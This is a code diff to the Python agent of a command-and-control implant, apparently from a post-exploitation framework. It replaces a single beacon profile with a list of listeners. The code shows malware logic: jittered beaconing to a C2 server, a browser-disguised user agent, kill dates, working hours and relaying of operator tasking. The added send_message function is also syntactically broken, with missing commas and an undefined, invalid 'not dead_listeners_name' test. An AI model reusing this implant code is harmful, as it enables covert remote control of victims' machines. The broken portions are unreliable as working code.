@@ -38,31 +38,17 @@ from threading import Thread
 
 # print "starting agent"
 
-# profile format ->
-#   tasking uris | user agent | additional header 1 | additional header 2 | ...
-profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
 
 if server.endswith("/"): server = server[0:-1]
 
-delay = 60
-jitter = 0.0
-lostLimit = 60
-missedCheckins = 0
+
 jobMessageBuffer = ''
-currentListenerName = ""
 sendMsgFuncCode = ""
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = 'REPLACE_KILLDATE'
 # workingHours form -> "9:00-17:00"
 workingHours = 'REPLACE_WORKINGHOURS'
-
-parts = profile.split('|')
-taskURIs = parts[0].split(',')
-userAgent = parts[1]
-headersRaw = parts[2:]
-
-defaultResponse = base64.b64decode("")
 
 jobs = []
 moduleRepo = {}
@@ -93,8 +79,70 @@ for headerRaw in headersRaw:
 # communication methods
 #
 ################################################
+listeners = [
 
-REPLACE_COMMS
+#LISTENER_DICT
+
+#    Example listener entry
+#    {
+#        'delay' : 60
+#        'jitter' : 0.0
+#        'profile': "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+#        'server': 10.10.10.10:8080,
+#        'fixed_parameters': {'param1': 12, 'param2': 'Mozilla'} #fixed immutable parameters used by the function such as the profile
+#        'send_func': myfunc,
+#        'lostLimit': 60,
+#        'missedCheckins':4,
+#        'defaultResponse':'whatever',
+#    },
+]
+
+#COMM_FUNCTION
+
+#def myfunc(data):
+#    #try to send data to listener example_listener
+
+def send_message(data = None):
+    global listeners
+
+    #Calls each listener in turn to try and send data back
+    #to C2. Only increases missedcheckins once every one has been tried
+    for listener in listeners:
+
+        # sleep for the randomized interval
+        if listener['jitter'] < 0: listener['jitter'] = -listener['jitter']
+        if listener['jitter'] > 1: listener['jitter'] = 1/listener['jitter']
+        minSleep = int((1.0-listener['jitter'])*listener['delay'])
+        maxSleep = int((1.0+listener['jitter'])*listener['delay'])
+
+        sleepTime = random.randint(minSleep, maxSleep)
+        time.sleep(sleepTime)
+
+        #use the sending function defined in the listener dict
+        result = listener['send_func'](packets = data, **listener['fixed_parameters'])
+
+        if result[0] == '200': #we got a message through
+
+            try:
+                send_job_message_buffer()
+            except Exception as e:
+                result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
+                process_job_tasking(result)
+
+            if data == listener['defaultResponse']:
+                listener['missedCheckins'] = 0
+            else:
+                decode_routing_packet(data)
+            
+            return
+
+        else: #update missedCheckins for this listener
+            listener['missedCheckins'] += 1
+
+    #remove dead listeners from list
+    listeners = [ item for item in listeners if item['name'] not dead_listeners_name ]
+
+    return
 
 
 ################################################
@@ -1024,34 +1072,12 @@ while(True):
                 send_message(build_response_packet(2, msg))
                 agent_exit()
 
-        # exit if we miss commnicating with the server enough times
-        if missedCheckins >= lostLimit:
+        # exit if we don't have listeners anymore
+        if not listeners:
             agent_exit()
 
-        # sleep for the randomized interval
-        if jitter < 0: jitter = -jitter
-        if jitter > 1: jitter = 1/jitter
-        minSleep = int((1.0-jitter)*delay)
-        maxSleep = int((1.0+jitter)*delay)
-
-        sleepTime = random.randint(minSleep, maxSleep)
-        time.sleep(sleepTime)
-
-        (code, data) = send_message()
-
-        if code == '200':
-            try:
-                send_job_message_buffer()
-            except Exception as e:
-                result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
-                process_job_tasking(result)
-            if data == defaultResponse:
-                missedCheckins = 0
-            else:
-                decode_routing_packet(data)
-        else:
-            pass
-            # print "invalid code:",code
+        #not returning anything since the work is done inside this function
+        send_message()
 
     except Exception as e:
         print "main() exception: %s" % (e)
